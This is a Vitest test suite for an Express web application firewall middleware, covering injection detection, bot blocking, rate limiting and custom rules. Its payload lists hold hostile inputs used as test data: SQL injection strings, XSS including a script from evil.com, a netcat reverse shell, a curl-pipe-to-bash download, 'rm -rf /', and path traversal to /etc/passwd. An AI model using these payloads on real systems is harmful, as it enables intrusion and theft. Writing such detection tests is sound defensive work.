/**
 * WAF Middleware Tests
 *
 * Comprehensive test suite for Web Application Firewall functionality
 */

import { Request, Response } from "express";
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

import {
  wafMiddleware,
  updateWAFConfig,
  getWAFConfig,
  blockIP,
  unblockIP,
  getBlockedIPs,
  addCustomRule,
  removeCustomRule,
  getWAFEvents,
  getWAFStats,
  clearRateLimit,
  clearAllRateLimits,
  resetWAFConfig,
  WAF_PATTERNS,
  WAFRule,
} from "./waf.middleware";

// Mock logger
vi.mock("@/utils/logger", () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
}));

// Mock env
vi.mock("@/config/env", () => ({
  env: {
    NODE_ENV: "test",
  },
}));

// Helper to create mock request
function createMockRequest(overrides: Partial<Request> = {}): Request {
  return {
    method: "GET",
    path: "/api/test",
    originalUrl: "/api/test",
    body: {},
    query: {},
    headers: {
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    },
    cookies: {},
    ip: "192.168.1.100",
    socket: { remoteAddress: "192.168.1.100" },
    get: vi.fn((header: string) => {
      if (header === "User-Agent") return overrides.headers?.["user-agent"] || "Mozilla/5.0";
      return undefined;
    }),
    ...overrides,
  } as unknown as Request;
}

// Helper to create mock response
function createMockResponse(): Response {
  const res = {
    status: vi.fn().mockReturnThis(),
    json: vi.fn().mockReturnThis(),
    setHeader: vi.fn().mockReturnThis(),
  };
  return res as unknown as Response;
}

describe("WAF Middleware", () => {
  beforeEach(() => {
    resetWAFConfig();
    clearAllRateLimits();
    // Clear blocked IPs
    getBlockedIPs().forEach((ip) => unblockIP(ip));
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  describe("Basic Functionality", () => {
    it("should allow legitimate requests", () => {
      const req = createMockRequest();
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(res.status).not.toHaveBeenCalled();
    });

    it("should skip WAF when disabled", () => {
      updateWAFConfig({ enabled: false });

      const req = createMockRequest({
        body: { input: "SELECT * FROM users" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should allow whitelisted paths", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        path: "/health",
        body: { input: "SELECT * FROM users" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should allow whitelisted IPs", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        ip: "127.0.0.1",
        socket: { remoteAddress: "127.0.0.1" },
        body: { input: "SELECT * FROM users" },
      } as Partial<Request>);
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });
  });

  describe("SQL Injection Detection", () => {
    const sqlInjectionPayloads = [
      "SELECT * FROM users WHERE id=1",
      "1' OR '1'='1",
      "1; DROP TABLE users--",
      "UNION SELECT username, password FROM users",
      "admin'--",
      "1' AND 1=1--",
      "'; EXEC xp_cmdshell('dir')--",
      "1' WAITFOR DELAY '0:0:10'--",
      "1' ORDER BY 1--",
      "BENCHMARK(10000000,SHA256('test'))",
    ];

    it.each(sqlInjectionPayloads)(
      "should detect SQL injection: %s",
      (payload) => {
        updateWAFConfig({ mode: "block" });

        const req = createMockRequest({
          body: { input: payload },
        });
        const res = createMockResponse();
        const next = vi.fn();

        wafMiddleware(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
        expect(next).not.toHaveBeenCalled();
      }
    );

    it("should detect SQL injection in query parameters", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        query: { id: "1 OR 1=1" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
    });
  });

  describe("XSS Detection", () => {
    const xssPayloads = [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "javascript:alert('xss')",
      "<svg onload=alert('xss')>",
      "<body onload=alert('xss')>",
      "<iframe src='javascript:alert(1)'>",
      "<div style='background:url(javascript:alert(1))'>",
      "'-alert(1)-'",
      "<script src='https://evil.com/xss.js'></script>",
    ];

    it.each(xssPayloads)("should detect XSS attack: %s", (payload) => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        body: { input: payload },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
      expect(next).not.toHaveBeenCalled();
    });
  });

  describe("Command Injection Detection", () => {
    const commandInjectionPayloads = [
      "; cat /etc/passwd",
      "| ls -la",
      "`whoami`",
      "$(id)",
      "&& rm -rf /",
      "|| ping -c 10 evil.com",
      "; nc -e /bin/sh attacker.com 4444",
      "| curl https://evil.com/shell.sh | bash",
    ];

    it.each(commandInjectionPayloads)(
      "should detect command injection: %s",
      (payload) => {
        updateWAFConfig({ mode: "block" });

        const req = createMockRequest({
          body: { command: payload },
        });
        const res = createMockResponse();
        const next = vi.fn();

        wafMiddleware(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
      }
    );
  });

  describe("Path Traversal Detection", () => {
    const pathTraversalPayloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\config\\sam",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "....//....//....//etc/passwd",
      "/etc/passwd",
      "/proc/self/environ",
      "C:\\Windows\\System32\\",
    ];

    it.each(pathTraversalPayloads)(
      "should detect path traversal: %s",
      (payload) => {
        updateWAFConfig({ mode: "block" });

        const req = createMockRequest({
          path: `/api/files/${payload}`,
          originalUrl: `/api/files/${payload}`,
        });
        const res = createMockResponse();
        const next = vi.fn();

        wafMiddleware(req, res, next);

        expect(res.status).toHaveBeenCalledWith(403);
      }
    );
  });

  describe("Bot Detection", () => {
    const maliciousBots = [
      "sqlmap/1.0",
      "Nikto/2.1.5",
      "nmap scripting engine",
      "masscan/1.0",
      "gobuster/3.1",
      "nuclei/2.0",
    ];

    it.each(maliciousBots)("should detect malicious bot: %s", (botUA) => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        headers: { "user-agent": botUA },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
    });
  });

  describe("IP Blocking", () => {
    it("should block blacklisted IPs", () => {
      updateWAFConfig({ mode: "block" });
      blockIP("10.0.0.1", "Test block");

      const req = createMockRequest({
        ip: "10.0.0.1",
        socket: { remoteAddress: "10.0.0.1" },
      } as Partial<Request>);
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
      expect(next).not.toHaveBeenCalled();
    });

    it("should unblock IPs correctly", () => {
      updateWAFConfig({ mode: "block" });
      blockIP("10.0.0.2");
      unblockIP("10.0.0.2");

      const req = createMockRequest({
        ip: "10.0.0.2",
        socket: { remoteAddress: "10.0.0.2" },
      } as Partial<Request>);
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should return blocked IPs list", () => {
      blockIP("10.0.0.3");
      blockIP("10.0.0.4");

      const blockedIPs = getBlockedIPs();

      expect(blockedIPs).toContain("10.0.0.3");
      expect(blockedIPs).toContain("10.0.0.4");
    });
  });

  describe("Rate Limiting", () => {
    it("should enforce rate limits", () => {
      updateWAFConfig({
        mode: "block",
        rateLimit: {
          windowMs: 60000,
          maxRequests: 3,
          blockDurationMs: 60000,
        },
      });

      const res = createMockResponse();
      const next = vi.fn();

      // First 3 requests should pass
      for (let i = 0; i < 3; i++) {
        const req = createMockRequest({ ip: "192.168.1.50" });
        wafMiddleware(req, res, next);
      }

      expect(next).toHaveBeenCalledTimes(3);

      // 4th request should be blocked
      const req = createMockRequest({ ip: "192.168.1.50" });
      wafMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(429);
    });

    it("should clear rate limit for specific IP", () => {
      updateWAFConfig({
        mode: "block",
        rateLimit: {
          windowMs: 60000,
          maxRequests: 2,
          blockDurationMs: 60000,
        },
      });

      // Exceed rate limit
      for (let i = 0; i < 5; i++) {
        const req = createMockRequest({ ip: "192.168.1.60" });
        const res = createMockResponse();
        wafMiddleware(req, res, vi.fn());
      }

      // Clear rate limit
      clearRateLimit("192.168.1.60");

      // Should be allowed again
      const req = createMockRequest({ ip: "192.168.1.60" });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });
  });

  describe("Custom Rules", () => {
    it("should add and enforce custom rules", () => {
      updateWAFConfig({ mode: "block" });

      const customRule: WAFRule = {
        id: "CUSTOM001",
        name: "Block Test Pattern",
        description: "Blocks requests containing 'forbidden-word'",
        pattern: /forbidden-word/gi,
        locations: ["body"],
        action: "block",
        severity: "high",
        enabled: true,
      };

      addCustomRule(customRule);

      const req = createMockRequest({
        body: { text: "This contains forbidden-word in it" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
    });

    it("should remove custom rules", () => {
      updateWAFConfig({ mode: "block" });

      const customRule: WAFRule = {
        id: "CUSTOM002",
        name: "Temporary Block",
        description: "Temporary rule",
        pattern: /temp-block/gi,
        locations: ["body"],
        action: "block",
        severity: "medium",
        enabled: true,
      };

      addCustomRule(customRule);
      removeCustomRule("CUSTOM002");

      const req = createMockRequest({
        body: { text: "temp-block" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });
  });

  describe("Monitor Mode", () => {
    it("should log but not block in monitor mode", () => {
      updateWAFConfig({ mode: "monitor" });

      const req = createMockRequest({
        body: { input: "SELECT * FROM users" },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(res.status).not.toHaveBeenCalled();
    });
  });

  describe("WAF Events and Stats", () => {
    it("should record WAF events", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        body: { input: "SELECT * FROM users" },
      });
      const res = createMockResponse();

      wafMiddleware(req, res, vi.fn());

      const events = getWAFEvents(10);
      expect(events.length).toBeGreaterThan(0);
      expect(events[events.length - 1].eventType).toBe("SQL_INJECTION");
    });

    it("should provide WAF statistics", () => {
      updateWAFConfig({ mode: "block" });

      // Generate some events
      const payloads = [
        { input: "SELECT * FROM users" },
        { input: "<script>alert(1)</script>" },
        { input: "'; DROP TABLE users--" },
      ];

      payloads.forEach((body) => {
        const req = createMockRequest({ body });
        const res = createMockResponse();
        wafMiddleware(req, res, vi.fn());
      });

      const stats = getWAFStats();

      expect(stats.totalEvents).toBeGreaterThan(0);
      expect(stats.blockedRequests).toBeGreaterThan(0);
    });
  });

  describe("Configuration Management", () => {
    it("should update WAF configuration", () => {
      updateWAFConfig({
        enabled: true,
        mode: "monitor",
        logLevel: "verbose",
      });

      const config = getWAFConfig();

      expect(config.enabled).toBe(true);
      expect(config.mode).toBe("monitor");
      expect(config.logLevel).toBe("verbose");
    });

    it("should reset to default configuration", () => {
      updateWAFConfig({
        mode: "monitor",
        logLevel: "verbose",
      });

      resetWAFConfig();

      const config = getWAFConfig();
      expect(config.logLevel).toBe("standard");
    });
  });

  describe("Pattern Validation", () => {
    it("should have valid SQL injection patterns", () => {
      expect(WAF_PATTERNS.SQL_INJECTION.length).toBeGreaterThan(0);
      WAF_PATTERNS.SQL_INJECTION.forEach((rule) => {
        expect(rule.pattern).toBeInstanceOf(RegExp);
        expect(rule.id).toBeDefined();
        expect(rule.severity).toBeDefined();
      });
    });

    it("should have valid XSS patterns", () => {
      expect(WAF_PATTERNS.XSS.length).toBeGreaterThan(0);
      WAF_PATTERNS.XSS.forEach((rule) => {
        expect(rule.pattern).toBeInstanceOf(RegExp);
        expect(rule.id).toBeDefined();
      });
    });

    it("should have valid command injection patterns", () => {
      expect(WAF_PATTERNS.COMMAND_INJECTION.length).toBeGreaterThan(0);
    });

    it("should have valid path traversal patterns", () => {
      expect(WAF_PATTERNS.PATH_TRAVERSAL.length).toBeGreaterThan(0);
    });
  });

  describe("Edge Cases", () => {
    it("should handle empty request body", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({ body: {} });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should handle null/undefined values", () => {
      updateWAFConfig({ mode: "block" });

      const req = createMockRequest({
        body: null,
        query: undefined,
      } as Partial<Request>);
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it("should handle very long payloads", () => {
      updateWAFConfig({ mode: "block" });

      const longPayload = "SELECT ".repeat(10000) + "* FROM users";
      const req = createMockRequest({
        body: { input: longPayload },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
    });

    it("should handle X-Forwarded-For header for IP detection", () => {
      updateWAFConfig({ mode: "block" });
      blockIP("203.0.113.1");

      const req = createMockRequest({
        headers: {
          "x-forwarded-for": "203.0.113.1, 198.51.100.1",
          "user-agent": "Mozilla/5.0",
        },
      });
      const res = createMockResponse();
      const next = vi.fn();

      wafMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
    });
  });

  describe("False Positive Prevention", () => {
    const legitimatePayloads = [
      "I want to select the best option from the list",
      "The user dropped their phone",
      "Insert the key into the lock",
      "Update your profile settings",
      "Delete old files from downloads",
      "This is a script for a movie",
      "Click here for more information",
      "The image source is correct",
    ];

    it.each(legitimatePayloads)(
      "should allow legitimate content: %s",
      (payload) => {
        updateWAFConfig({ mode: "block" });

        const req = createMockRequest({
          body: { description: payload },
        });
        const res = createMockResponse();
        const next = vi.fn();

        wafMiddleware(req, res, next);

        expect(next).toHaveBeenCalled();
      }
    );
  });
});
